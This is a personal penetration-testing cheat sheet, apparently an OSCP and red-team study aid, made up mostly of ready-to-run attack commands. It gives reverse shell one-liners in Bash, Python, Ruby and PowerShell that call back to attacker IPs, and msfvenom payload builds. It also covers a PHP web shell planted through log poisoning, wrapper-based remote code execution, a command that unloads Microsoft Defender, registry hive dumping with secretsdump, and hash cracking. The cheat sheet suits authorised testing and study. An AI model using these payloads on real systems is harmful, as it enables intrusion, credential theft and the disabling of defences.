# Pentest Cheat Sheet
There are many cheat sheets out there, but this is mine. It's a work in progress right now, and lives as a rought draft that's updated a lot. I started this while I was studying for my OSCP, but it's now evolving to include more practical things that I need as a red teamer. The new additions will most likely be of no use on the exam, and may even include tools that are banned.




## Recon
Very incomplete...

### Linux Local
`find / -name flag.txt` to find files by name.  

`grep -R "flag40" / -s -n` loot for string in files, recursively searching them from the root directory, no error output. 

### Windows Local
`dir /s flag.txt` to find files in current directory and subdirectories named flag.txt.


### Active Directory  
A useful tool -> [wadcoms.github.io](https://wadcoms.github.io)

### Port Scanning 

#### nmap
`nmap -sn 10.11.1.0/24` network sweep to find hosts. 
  * `nmap -sn  10.11.1.0/24 -oG - | awk '/Up$/{print $2}' > list_ips.txt` sweep network for IP's that are up, and save the IP addresses in a list.

`nmap -A 10.10.10.10` for a quick scan of common TCP ports with OS and service detection.

`nmap -A 10.10.10.10 -p-` to scan all TCP ports with OS and service detection.

`nmap -A -sU 10.10.10.10` to scan all UDP ports with OS and service detection.

`sudo nmap -O -A -sV 10.10.10.10` to scan all common TCP ports, finger print the OS, run scrips and grab banners.

#### Through Proxychains
`proxychains nmap -Pn -sT 10.10.10.10 -v` because ICMP/UDP scans don't work.

#### Netcat
The `-w` flag to specify timeout in seconds and `-z` flag to send zero data (for scanning)

`nc -nvv -w 1 -z 10.11.1.220 3388-3390` TCP scan from ports 3388-3390.

`nc -nv -u -z -w 1 10.11.1.115 160-162` UDP scan from ports 160-162.

### Directory Enumeration

#### Gobuster  

* Directory busting example `gobuster dir -u http://10.1.1.27 -w /usr/share/wordlists/dirb/big.txt`.

I like [dirsearch](https://github.com/maurosoria/dirsearch) also.

Useful wordlists on Kali
```
kali@kali:~/Tools/dirsearch$ ls /usr/share/wordlists
dirb  dirbuster  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt  rockyou.txt.gz  wfuzz
kali@kali:~/Tools/dirsearch$ ls /usr/share/seclists
Discovery  Fuzzing  IOCs  Miscellaneous  Passwords  Pattern-Matching  Payloads  README.md  Usernames  Web-Shells
kali@kali:~/Tools/dirsearch$ 
```

`python3 dirsearch.py -u http://10.11.1.44 -t 100 -e php,gzip,tar,txt -w /usr/share/wordlists/dirb/big.txt -r` directory enum with dirb's big.txt, copy/paste and just IP/URL and extensions.

`python3 dirsearch.py -u http://10.11.1.44 -t 100 -e php,gzip,tar,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r` directory enum with dirbuster's directory list, copy/paste and just IP/URL and extensions.

`python3 dirsearch.py -u http://10.11.1.71 -t 100 -e cgi -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -r`, brute force CGI's.

### Enumerate shared folders (rsync)

An rsync module is essentially a directory share. These modules can optionally be protected by a password. This options lists the available modules and, optionally, determines if the module requires a password to access**:**

```
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
```

### SMB Enumeration
#### Manual
`smbclient -L 10.11.1.146` To list availble shares

`smbclient //10.11.1.146/IPC$` to login to that share. If that doesn't work, try to sudo... `sudo smbclient //10.11.1.146/IPC$`

#### Automated
`enum4linux 10.11.1.146 -a -o` to use enum4linux to automate smb share.


### RPC Enumeration
If you can connect with **Null** logon -> `rpcclient -U '' -N forest.htb`.  

```
rpcclient $> querydomaininfo
command not found: querydomaininfo
rpcclient $> querydominfo
Domain:         HTB
Server:
Comment:
Total Users:    105
Total Groups:   0
Total Aliases:  0
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```  

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> 
```


[Good Article](https://mucomplex.medium.com/remote-procedure-call-and-active-directory-enumeration-616b234468e5)  
[Another Good One](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/)  


### NFS
`showmount -e 10.10.10.10` to see available mounts
`mount -t nfs 10.10.10.10:/ /tmp -o nolock` to mount the root, or whatever folder.

### SNMP Enumeration

`onesixtyone -c community -i ips` scan target network to identify SNMP servers where community and ips are lists community = (public, private, manager).

`snmp-check 10.11.1.227` does everything below, but better and formats it for you nicely :)

`snmpwalk -c public -v1 -t 10 10.11.1.115` enumerate entire MIB tree.

`snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25` enumerate Windows users.

`snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2` enumerate Windows running processes.

`snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3` enumerate open TCP ports.

`snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2` enumerate installed software.

## Reverse Shells

### Bash
`/bin/bash -i >& /dev/tcp/192.168.119.137/1337 0>&1`


### Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.10.14.3",8081).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


### PowerShell
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.137',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Listeners

#### Netat
`nc -lvp 4444` listen (catch) reverse shell with Netcat on port 4444

### Span TTY Shell
`python -c 'import pty; pty.spawn("/bin/bash")'` or `python3 -c 'import pty; pty.spawn("/bin/bash")'`


### MSFVenom
#### ASP
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.137 LPORT=4444 -f asp > shell.asp`

#### WAR
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.137 LPORT=4444 -f war > shell.war`

#### JSP
This also works for Cold Fusion instead of the crazy web shell
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.137 LPORT=4444 -f raw > shell.jsp`

#### Linux Binary
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.133 LPORT=443 -f elf > shell.elf`

#### Shell Code
`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"` encode bad characters, windows shell.

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode` Linux, with python output as an option.


## Tunneling and Pivoting

Local port forwarding. Example below allows access to services on pandora.htb, only available on localhost.  
`ssh -L 127.0.0.1:9050:pandora.htb:80 daneil@pandora.htb`

Dynamic port forwarding.  
`ssh -D 9050 root@52.133.0.19`  


### RDP Cheats  
Use *xfreerdp* if rdesktop ever fails by giving you `Certificate recieved from server is NOT trusted by this sytem,...`  

 `proxychains4 xfreerdp /u:dev /v:10.0.0.5:3389`    

## Privilege Escalation
### Linux

`sudo -l`, if there's anything interesting like running scripts as users with `NOPASSWD: ALL`.

#### Distro Version
* `cat /etc/issue`

#### Kernel Version and Architecture
* `uname -r `
* `arch`

#### Find Writable Directories
`find / -writable -type d 2>/dev/null`

#### View SUID Binaries
`find / -perm -u=s -type f 2>/dev/null`

#### Processes Running
`ps axu` 

#### Check Services Listening
`ss -lnpt`

#### Cron Jobs
`ls -la /etc/cron.d`  prints cron jobs which are already present in cron.d


### Windows

`powershell -c "Invoke-WebRequest -Uri http://10.10.14.10/39719.ps1 -OutFile ./39719.ps1` File transfer for dummies 

`systeminfo` to get good info.

`tasklist /SVC` to view running services.

`sc queryex type=service state=all` to query all services, whether or not they're running.

#### Finding Kernel Exploits
[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

#### Cross Compile Exploits
`i686-w64-mingw32-gcc shell.c -o shell.exe` 32bit Windows
`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32` 

`x86_64-w64-mingw32-gcc 271.c -o 271.exe` 64bit Windows

## File Transfers  

### Windows XP (FTP Method)  
1. Start FTP server on kali via `sudo python3 -m pyftpdlib -p 21`.
2. On victim...
```
echo open 192.168.119.150>ftp.txt
echo USER anonymous a>>ftp.txt
echo binary>>ftp.txt
echo GET file.exe>>ftp.txt
echo bye>>ftp.txt
ftp -v -n -s:ftp.txt
```

### Windows Powershell 4.0 & 5.0
If no `wget` alias, try `Invoke-WebRequest "http://192.168.119.229/mimikatz64.exe" -OutFile "C:\Users\administrator.xor\Desktop\m.exe"`.

## Buffer Overflow

### Bad Characters
```python
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
```

### Locate EIP
`msf-pattern_create -l 2196` generate unique pattern to overflow the stack.

`msf-pattern_offset -l 2196 -q 72433372` locate the offset of the value in EIP at crashtime. 


### nsf-nasm_shell (Generate Opcodes)
```
kali@kali: ~$ msf-nasm_shell
nasm > add eax,12
00000000  83C00C            add eax,byte +0xc
nasm > JMP EAX
00000000  FFE0              jmp eax
nasm > 
```

## Web Application Exploits

### LFI (Local File Inclusion)
[Linux LFI List](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list)

#### Contaminating Log Files
Write php code to log file for executing shell commands
```
kali@kali:~$ nc -nv 10.11.0.22 80
(UNKNOWN) [10.11.0.22] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

`http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig` call url with LFI and GET['cmd']

### RFI (Remote File Inclusion)
Note that the `%00` at the end helps do the damn thing if need be.
```
https://sucka.com/internal/advanced_comment_system/index.php?ACS_path=http://192.168.119.150/test.txt%00
```


### PHP Wrappers
`http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>` to execute arbitrary php code.

`http://192.168.111.53:4443/site/index.php?page=data:text/plain,<?php echo shell_exec("powershell.exe -executionPolicy Unrestricted -InputFormat none -File reverse.ps1") ?>` reverse shell via PowerSHell using wrappers


## Antivirus Evasion

### MacOS

#### Killing Microsoft Defender
```bash
launchctl unload /Library/LaunchAgents/com.microsoft.wdav.tray.plist
```


## Password Cracking

### Loot Windows Registry
```
C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
C:\> reg.exe save hklm\security c:\windows\temp\security.save
C:\> reg.exe save hklm\system c:\windows\temp\system.save
```
### Impacket Secrets Dump
To dump the secrets/hashes from the files saved above `impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL > SECRETS.DUMP && cat SECRETS.DUMP`. 

### Impacket GetUserSPNs  
To dump the TGT hash of a domain user that has UF_DONT_REQUIRE_PREAUTH set: `impacket-GetNPUsers -no-pass -dc-ip forest.htb htb/svc-alfresco`.  


### /etc/shadow
Hash algorithm cheat sheet `bob:$1$Rrhb4lzg$Ee8/JYZjv.NimwyrSEL6R/:16903:0:99999:7:::`

* $1$ is MD5 (md5crypt) 
* $2a$ is Blowfish
* $2y$ is Blowfish
* $5$ is SHA-256
* $6$ is SHA-512

The salt is `Rrhb4lzg`

The hash is `Ee8/JYZjv.NimwyrSEL6R/`

### Crack via hashcat 

#### /etc/shadow  
1. Create hashfile `1$Rrhb4lzg$Ee8/JYZjv.NimwyrSEL6R/` as bob.hash
2. Examples
  * `hashcat -m 500 -a 0 bob.hash /usr/share/wordlists/rockyou.txt --force` for $1$
  * `hashcat -m 1800 -a 0 bob.hash /usr/share/wordlists/rockyou.txt --force` for $6$

#### Windows SAM  
1. Create hashfile `Administrator:500:aad3b435b51404eeaad3b435b51404ee:3fee04b01f59a1001a366a7681e95699:::`.
2. Crack `hashcat -m 1000 -a 0 admin.hash ~/rockyou.txt --force`.

#### Windows Domain Login
1. Create hashfile `$DCC2$10240#Administrator#68381d9a192e14343ea381574668c83c`.
2. Crack `john --wordlist=~/rockyou.txt tgt.hash`.

#### Kerberos TGT  
1. Creat hashfile `$krb5asrep$23$svc-alfresco@HTB:6d400d8f440d63dcb3d152e07796abad$6fe3b792a228a8d460673fb0ddf4df02ee4f50e46bd0a02f8d3b722179aa342a743fa27779d984d44dc2ae6c0a96cb6de46a007a82cb24448b4dea2bdde5151c8c0b2a8dcd6c0a050e6d6f126f5ae495c127a486df91d51f3d08e79c218477caf936a189f34fe3df258360091161d4f935bf1b9cc0bb69cfd1ddfa60cc3426d4f49ad7926f74f6be6be4754fa4bbbbad2ca3d7f5df76ce34a03a85c4c7e9a6db76599acaa4ebe1ce5bdcfcc5caa7f883ab9cf99560cb1339eb87e7c175fc9c1d6123362be751c6fd9ca583512a4fdde5f833af279c64378bc7d321391f40c833`. 
2. Crack hash `hashcat -m 13100 tgt.hash ~/rockyou.txt --force`.

[Hashcat modes](https://hashcat.net/wiki/doku.php?id=example_hashes)

## Useful Exploits

### Linux/Unix
#### Postfix Shell SHock
 * [postfix-shellshock-nc.py](https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py)

### Windows
#### MS17-010 /  CVE-2017-0144 (Eternal Blue)
* [AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)
 
#### MS08-067
* [MS08-067](https://github.com/andyacer/ms08_067)

#### MS03-026
* [RPC DCOM](https://www.exploit-db.com/exploits/66)

### Apache Tomcat
#### CVE-2017-12617
* [CVE-2017-12617](https://github.com/cyberheartmi9/CVE-2017-12617)


## Further Help
* [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/reverse-shell.html)
* [Windows Kernal Exploits](https://kakyouim.hatenablog.com/entry/2020/05/27/010807)
